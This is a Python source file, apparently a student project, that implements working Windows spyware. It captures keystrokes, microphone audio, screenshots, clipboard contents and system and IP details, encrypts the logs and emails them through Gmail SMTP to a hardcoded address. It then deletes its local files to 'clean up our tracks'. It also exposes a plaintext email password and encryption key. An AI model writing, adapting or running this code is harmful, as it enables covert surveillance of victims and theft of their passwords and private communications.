# Libraries

#For Email functionality
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

#socket and platform for gettting computer information
import socket
import platform

#get clipboard information
import win32clipboard

#keystrokes from pynput library
from pynput.keyboard import Key, Listener

import time
import os
import datetime

#for microphone
from scipy.io.wavfile import write
import sounddevice as sd

#encrypt our files before sending in the mail
from cryptography.fernet import Fernet

#get the username and requests library for computer information
import getpass
from requests import get

#for screenshot funcitonality
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 15
time_iteration = 60
number_of_iterations_end = 1

email_address = "misrvce123@gmail.com" # Enter email here
password = "pxvqvshdejugbrmt" # Enter password here

#if needed
username = getpass.getuser()

toaddr = "misrvce123@gmail.com" # Enter the email address you want to send your information to

key = "17JXU9qjPI_-nl2jOLdp8580VCt_wswCVuipWVHz3ik=" # Generate an encryption key from the Cryptography folder

file_path = "C:\\Users\\"+username+"\\OneDrive\\Desktop\\MISPROJECT\\KeyloggerProject" # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend

# email controls
def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    # intialize message using MIME protocol -> Multi internet mail extension protocol
    # enables custom attachments like videos,images and also enables addition of messages
    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "MIS Project. Report Generated at " + str(datetime.datetime.now());

    #attach body to msg
    msg.attach(MIMEText(body, 'plain'))


    filename = filename
    attachment = open(attachment, 'rb')

    #deafult setting
    p = MIMEBase('application', 'octet-stream')

    #encode message
    p.set_payload((attachment).read())

    #encoding using base64
    encoders.encode_base64(p)

    #email-header
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    #finally attach attachment to msg
    msg.attach(p)

    #create smtp session
    s = smtplib.SMTP('smtp.gmail.com', 587)

    #start a tls session
    s.starttls()

    #login into gmail
    s.login(fromaddr, password)

    #convert msg to string finally before sending a mail
    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

# send_email(keys_information, file_path + extend + keys_information, toaddr)

# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        #get the host name by this funciton
        hostname = socket.gethostname()
        # getting the ip addr of hostname
        IPAddr = socket.gethostbyname(hostname)
        try:
            #using an api to get the public api
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        #insight into processor information
        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

# computer_information()

# get the clipboard contents
def copy_clipboard():
    # store in a file
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

# copy_clipboard()

# get the microphone
def microphone():
    #sampling frequency
    fs = 44100
    seconds = microphone_time

    #starting the recording for the seconds mentioned in the microhpone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    #writing the information
    write(file_path + extend + audio_information, fs, myrecording)

# get screenshots
def screenshot():
    im = ImageGrab.grab()
    #saving the image
    im.save(file_path + extend + screenshot_information)

# screenshot()

#the base informaiton to use and compare with
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

microphone()
# calling the microphone before hand so that it can start caputuring before


# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]


    # count is the number of key presses and key is a list
    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        # when count>=1 write the key to the key file as per the variables
        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                # 'h''e''l' -> hel
                k = str(key).replace("'", "")
                # if a space is typed then new line is created
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                #no need to include things like Shift or Caps
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        #if currentTime becomese greater than stop the timer completly
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        # with open(file_path + extend + keys_information, "w") as f:
        #     f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        computer_information()
        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

#end of while loop
# Encrypt files
#make it hidden in normal use case
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]
attachment_file_names = [system_information_e,clipboard_information_e,keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    #encryption using fernet
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    #after encryption write it one more file
    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(attachment_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

send_email(audio_information,audio_information,toaddr);
time.sleep(20)

# Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)




